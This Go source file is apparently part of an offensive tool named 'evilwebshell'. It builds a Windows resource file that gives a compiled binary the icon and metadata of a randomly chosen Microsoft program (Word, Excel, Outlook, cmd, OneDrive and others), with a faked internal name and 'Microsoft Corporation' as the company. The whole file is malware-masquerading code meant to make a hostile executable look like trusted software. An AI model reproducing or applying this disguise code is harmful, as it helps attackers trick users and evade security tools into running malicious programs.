package core

import (
	"evilwebshell/icon"
	"fmt"
	"fyne.io/fyne/v2"
	"github.com/josephspurrier/goversioninfo"
	"io/ioutil"
	"log"
	"math/rand"
	"os"
	"path"
	"strconv"
	"strings"
	"time"
)

type info struct {
	InternalName     string
	FileDescription  string
	LegalCopyright   string
	FileVersion      string
	OriginalFilename string
	ProductName      string
	ProductVersion   string
	Major            int
	Minor            int
	Patch            int
	Build            int
}

var (
	info1 = info{
		InternalName:     "",
		FileDescription:  "",
		LegalCopyright:   "",
		FileVersion:      "",
		OriginalFilename: "",
		ProductName:      "",
		ProductVersion:   "",
		Major:            0,
		Minor:            0,
		Patch:            0,
		Build:            0,
	}
)

func getRandstring(length int) string {
	if length < 1 {
		return ""
	}
	char := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	charArr := strings.Split(char, "")
	charlen := len(charArr)
	ran := rand.New(rand.NewSource(time.Now().Unix()))

	var testchar = ""
	for i := 1; i <= length; i++ {
		testchar = testchar + charArr[ran.Intn(charlen)]

	}
	return testchar
}
func getRandint(length int) int {
	if length < 1 {
		return 0
	}
	char := "0123456789"
	charArr := strings.Split(char, "")
	charlen := len(charArr)
	ran := rand.New(rand.NewSource(time.Now().Unix()))

	var rchar = ""
	for i := 1; i <= length; i++ {
		rchar = rchar + charArr[ran.Intn(charlen)]
	}
	inter, _ := strconv.Atoi(rchar)
	return inter
}

func generatesyso() {
	Binaryname := []string{"Excel", "Word", "Outlook", "Powerpnt", "lync", "cmd", "OneDrive", "OneNote"}
	name := Binaryname[GenerateNumer(0, 8)]
	ico := &fyne.StaticResource{}

	switch name {
	case "cmd":
		ico = icon.ResourceCmdIco
	case "Excel":
		ico = icon.ResourceExcelIco
	case "Word":
		ico = icon.ResourceWordIco
	case "lync":
		ico = icon.ResourceLyncIco
	case "Outlook":
		ico = icon.ResourceOutlookIco
	case "Powerpnt":
		ico = icon.ResourcePowerpointIco
	case "OneNote":
		ico = icon.ResourceOnenoteIco
	case "OneDrive":
		ico = icon.ResourceOnedriveIco
	}
	err := ioutil.WriteFile(path.Join(TempDir, ico.Name()), ico.Content(), os.ModePerm)
	if err != nil {
		return
	}

	FileProperties(name)
}

//goenviroment

func FileProperties(name string) string {
	info1.InternalName = getRandstring(6)
	info1.FileDescription = getRandstring(15)
	info1.LegalCopyright = getRandstring(20)
	info1.FileVersion = getRandstring(13)
	info1.OriginalFilename = getRandstring(9)
	info1.ProductName = getRandstring(10)
	info1.ProductVersion = getRandstring(11)
	info1.Major = getRandint(2)
	info1.Minor = getRandint(1)
	info1.Patch = getRandint(5)
	info1.Build = getRandint(5)

	fmt.Println("[*] Creating an Embedded Resource File")
	vi := &goversioninfo.VersionInfo{}

	if name == "OneNote" {
		vi.IconPath = "onenote.ico"
		vi.IconPath = path.Join(TempDir, vi.IconPath)
		vi.StringFileInfo.InternalName = info1.InternalName
		vi.StringFileInfo.FileDescription = info1.FileDescription
		vi.StringFileInfo.LegalCopyright = info1.LegalCopyright
		vi.StringFileInfo.FileVersion = info1.FileVersion
		vi.StringFileInfo.OriginalFilename = info1.OriginalFilename
		vi.StringFileInfo.ProductName = info1.ProductName
		vi.StringFileInfo.ProductVersion = info1.ProductVersion
		vi.FixedFileInfo.FileVersion.Major = info1.Major
		vi.FixedFileInfo.FileVersion.Minor = info1.Minor
		vi.FixedFileInfo.FileVersion.Patch = info1.Patch
		vi.FixedFileInfo.FileVersion.Build = info1.Build
		vi.StringFileInfo.InternalName = "OneNote"
	} //
	if name == "Excel" {
		vi.IconPath = "excel.ico"
		vi.IconPath = path.Join(TempDir, vi.IconPath)
		vi.StringFileInfo.InternalName = info1.InternalName
		vi.StringFileInfo.FileDescription = info1.FileDescription
		vi.StringFileInfo.LegalCopyright = info1.LegalCopyright
		vi.StringFileInfo.FileVersion = info1.FileVersion
		vi.StringFileInfo.OriginalFilename = info1.OriginalFilename
		vi.StringFileInfo.ProductName = info1.ProductName
		vi.StringFileInfo.ProductVersion = info1.ProductVersion
		vi.FixedFileInfo.FileVersion.Major = info1.Major
		vi.FixedFileInfo.FileVersion.Minor = info1.Minor
		vi.FixedFileInfo.FileVersion.Patch = info1.Patch
		vi.FixedFileInfo.FileVersion.Build = info1.Build
		vi.StringFileInfo.InternalName = "Excel"
	} //
	if name == "Word" {
		vi.IconPath = "word.ico"
		vi.IconPath = path.Join(TempDir, vi.IconPath)
		vi.StringFileInfo.InternalName = info1.InternalName
		vi.StringFileInfo.FileDescription = info1.FileDescription
		vi.StringFileInfo.LegalCopyright = info1.LegalCopyright
		vi.StringFileInfo.FileVersion = info1.FileVersion
		vi.StringFileInfo.OriginalFilename = info1.OriginalFilename
		vi.StringFileInfo.ProductName = info1.ProductName
		vi.StringFileInfo.ProductVersion = info1.ProductVersion
		vi.FixedFileInfo.FileVersion.Major = info1.Major
		vi.FixedFileInfo.FileVersion.Minor = info1.Minor
		vi.FixedFileInfo.FileVersion.Patch = info1.Patch
		vi.FixedFileInfo.FileVersion.Build = info1.Build
		vi.StringFileInfo.InternalName = "Word"
	} //
	if name == "Powerpnt" {
		vi.IconPath = "powerpoint.ico"
		vi.IconPath = path.Join(TempDir, vi.IconPath)
		vi.StringFileInfo.InternalName = info1.InternalName
		vi.StringFileInfo.FileDescription = info1.FileDescription
		vi.StringFileInfo.LegalCopyright = info1.LegalCopyright
		vi.StringFileInfo.FileVersion = info1.FileVersion
		vi.StringFileInfo.OriginalFilename = info1.OriginalFilename
		vi.StringFileInfo.ProductName = info1.ProductName
		vi.StringFileInfo.ProductVersion = info1.ProductVersion
		vi.FixedFileInfo.FileVersion.Major = info1.Major
		vi.FixedFileInfo.FileVersion.Minor = info1.Minor
		vi.FixedFileInfo.FileVersion.Patch = info1.Patch
		vi.FixedFileInfo.FileVersion.Build = info1.Build
		vi.StringFileInfo.InternalName = "Powerpnt"
	} //
	if name == "Outlook" {
		vi.IconPath = "outlook.ico"
		vi.IconPath = path.Join(TempDir, vi.IconPath)
		vi.StringFileInfo.InternalName = info1.InternalName
		vi.StringFileInfo.FileDescription = info1.FileDescription
		vi.StringFileInfo.LegalCopyright = info1.LegalCopyright
		vi.StringFileInfo.FileVersion = info1.FileVersion
		vi.StringFileInfo.OriginalFilename = info1.OriginalFilename
		vi.StringFileInfo.ProductName = info1.ProductName
		vi.StringFileInfo.ProductVersion = info1.ProductVersion
		vi.FixedFileInfo.FileVersion.Major = info1.Major
		vi.FixedFileInfo.FileVersion.Minor = info1.Minor
		vi.FixedFileInfo.FileVersion.Patch = info1.Patch
		vi.FixedFileInfo.FileVersion.Build = info1.Build
		vi.StringFileInfo.InternalName = "Outlook"
	} //
	if name == "lync" {
		vi.IconPath = "lync.ico"
		vi.IconPath = path.Join(TempDir, vi.IconPath)
		vi.StringFileInfo.InternalName = info1.InternalName
		vi.StringFileInfo.FileDescription = info1.FileDescription
		vi.StringFileInfo.LegalCopyright = info1.LegalCopyright
		vi.StringFileInfo.FileVersion = info1.FileVersion
		vi.StringFileInfo.OriginalFilename = info1.OriginalFilename
		vi.StringFileInfo.ProductName = info1.ProductName
		vi.StringFileInfo.ProductVersion = info1.ProductVersion
		vi.FixedFileInfo.FileVersion.Major = info1.Major
		vi.FixedFileInfo.FileVersion.Minor = info1.Minor
		vi.FixedFileInfo.FileVersion.Patch = info1.Patch
		vi.FixedFileInfo.FileVersion.Build = info1.Build
		vi.StringFileInfo.InternalName = "Lync"
	} //
	if name == "cmd" {
		vi.IconPath = "cmd.ico"
		vi.IconPath = path.Join(TempDir, vi.IconPath)
		vi.StringFileInfo.InternalName = info1.InternalName
		vi.StringFileInfo.FileDescription = info1.FileDescription
		vi.StringFileInfo.LegalCopyright = info1.LegalCopyright
		vi.StringFileInfo.FileVersion = info1.FileVersion
		vi.StringFileInfo.OriginalFilename = info1.OriginalFilename
		vi.StringFileInfo.ProductName = info1.ProductName
		vi.StringFileInfo.ProductVersion = info1.ProductVersion
		vi.FixedFileInfo.FileVersion.Major = info1.Major
		vi.FixedFileInfo.FileVersion.Minor = info1.Minor
		vi.FixedFileInfo.FileVersion.Patch = info1.Patch
		vi.FixedFileInfo.FileVersion.Build = info1.Build
		vi.StringFileInfo.InternalName = "Cmd.exe"
	} //
	if name == "OneDrive" {
		vi.IconPath = "onedrive.ico"
		vi.IconPath = path.Join(TempDir, vi.IconPath)
		vi.StringFileInfo.InternalName = info1.InternalName
		vi.StringFileInfo.FileDescription = info1.FileDescription
		vi.StringFileInfo.LegalCopyright = info1.LegalCopyright
		vi.StringFileInfo.FileVersion = info1.FileVersion
		vi.StringFileInfo.OriginalFilename = info1.OriginalFilename
		vi.StringFileInfo.ProductName = info1.ProductName
		vi.StringFileInfo.ProductVersion = info1.ProductVersion
		vi.FixedFileInfo.FileVersion.Major = info1.Major
		vi.FixedFileInfo.FileVersion.Minor = info1.Minor
		vi.FixedFileInfo.FileVersion.Patch = info1.Patch
		vi.FixedFileInfo.FileVersion.Build = info1.Build
		vi.StringFileInfo.InternalName = "OneDrive.exe"
	} //

	vi.StringFileInfo.CompanyName = "Microsoft Corporation"

	vi.Build()
	vi.Walk()

	var archs []string
	archs = []string{"amd64"}
	for _, item := range archs {
		fileout := "resource_windows.syso"
		if err := vi.WriteSyso(path.Join(TempDir, fileout), item); err != nil {
			log.Printf("Error writing syso: %v", err)
			os.Exit(3)
		}
	}
	fmt.Println("[+] Created Embedded Resource File With " + name + "'s Properties")
	return name
}
